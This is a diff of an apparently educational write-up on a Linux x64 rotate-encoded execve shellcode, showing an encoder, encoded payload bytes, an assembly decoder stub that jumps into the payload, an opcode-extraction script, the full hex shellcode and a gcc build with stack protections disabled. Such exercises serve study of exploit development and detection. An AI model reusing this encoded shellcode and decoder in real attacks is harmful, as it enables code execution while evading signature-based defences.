@@ -50,11 +50,15 @@ for x in bytearray(shellcode) :
 print encoded+"0xaa"
 print 'Len: %d' % len(bytearray(shellcode))
 ```  
+
 + The byte 0xaa is added to the end of the payload. This is how our ROR decoder will know it has reached the end of the payload.
+
 ## Encoding the Payload
 ```bash
 root# python rotateLeftEncoder.py
-0x90,0x62,0xed,0x90,0xef,0xcd,0x90,0x62,0xff,0xae,0x90,0x07,0x85,0xd0,0xa4,0x90,0x75,0x5e,0xc4,0xd2,0xdc,0x5e,0xc4,0xc2,0xe6,0xa4,0x90,0x62,0xa5,0x90,0x13,0xcf,0x61,0x76,0x1e,0x0a,0xaa
+0x90,0x62,0xed,0x90,0xef,0xcd,0x90,0x62,0xff,0xae,0x90,0x07,\
+0x85,0xd0,0xa4,0x90,0x75,0x5e,0xc4,0xd2,0xdc,0x5e,0xc4,0xc2,\
+0xe6,0xa4,0x90,0x62,0xa5,0x90,0x13,0xcf,0x61,0x76,0x1e,0x0a,0xaa
 Len: 36
 ```
 
@@ -65,17 +69,17 @@ Len: 36
 global _start
 section .text
 _start:
-  jmp short call_decoder ; 1. jump to where the shellcode string is
+  jmp short call_decoder ; 1. jump to shellcode string
 decoder:
-  pop rsi                ; 3. Put string location in esi register
+  pop rsi                ; 3. RSI=&String 
 decode:
-  ror byte [rsi], 1      ; 4. decode the byte by bitwise rotate right
-  cmp byte [rsi], 0x55   ; 5. Is this the last byte? ror 0xaa, 1 = 0x55
-  je Shellcode           ;    - If so jump into the payload and execute
-  inc rsi                ; 6. Not end? Move forward 1 byte
+  ror byte [rsi], 1      ; 4. decode byte with bitwise rotate right
+  cmp byte [rsi], 0x55   ; 5. Last byte? ror 0xaa, 1 = 0x55
+  je Shellcode           ;    - Yes? jump to payload and execute
+  inc rsi                ; 6. No? Move forward 1 byte
   jmp short decode       ; 7. Lets decode the next byte
 call_decoder:
-  call decoder           ; 2. Put the mem location of the string on the stack
+  call decoder           ; 2. [RSP]=&String
   Shellcode: db 0x90,0x62,0xed,0x90,0xef,0xcd,0x90,0x62,0xff,0xae,\
                 0x90,0x07,0x85,0xd0,0xa4,0x90,0x75,0x5e,0xc4,0xd2,\
                 0xdc,0x5e,0xc4,0xc2,0xe6,0xa4,0x90,0x62,0xa5,0x90,\
@@ -83,6 +87,7 @@ call_decoder:
 ```
 
 ## Getting the ROR Decoder Shellcode
+
 ```bash
 root# cat getshellcode.sh
 #!/bin/bash
@@ -93,10 +98,15 @@ nasm -f elf64 $asmFile -o $objFile
 for i in $(objdump -D $objFile | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo ''
 
 root# ./getshellcode.sh rotateRightDecoder.asm
-\xeb\x0d\x5e\xd0\x0e\x80\x3e\x55\x74\x0a\x48\xff\xc6\xeb\xf4\xe8\xee\xff\xff\xff\x90\x62\xed\x90\xef\xcd\x90\x62\xff\xae\x90\x07\x85\xd0\xa4\x90\x75\x5e\xc4\xd2\xdc\x5e\xc4\xc2\xe6\xa4\x90\x62\xa5\x90\x13\xcf\x61\x76\x1e\x0a\xaa
+\xeb\x0d\x5e\xd0\x0e\x80\x3e\x55\x74\x0a\x48\xff
+\xc6\xeb\xf4\xe8\xee\xff\xff\xff\x90\x62\xed\x90
+\xef\xcd\x90\x62\xff\xae\x90\x07\x85\xd0\xa4\x90
+\x75\x5e\xc4\xd2\xdc\x5e\xc4\xc2\xe6\xa4\x90\x62
+\xa5\x90\x13\xcf\x61\x76\x1e\x0a\xaa
 ```
 
 # Testing the ROR Decoder
+
 ```c
 // Shellcode Title:  Linux/x64 - ROL Encoded Execve Shellcode (57 bytes)
 // Shellcode Author: Bobby Cooke
@@ -129,7 +139,8 @@ int main()
 
 ```
 
-### Final Test
+## Final Test
+
 ```bash
 root# gcc -m64 -z execstack -fno-stack-protector shellcode.c -o shellcode
 root# echo $$ | xargs ps
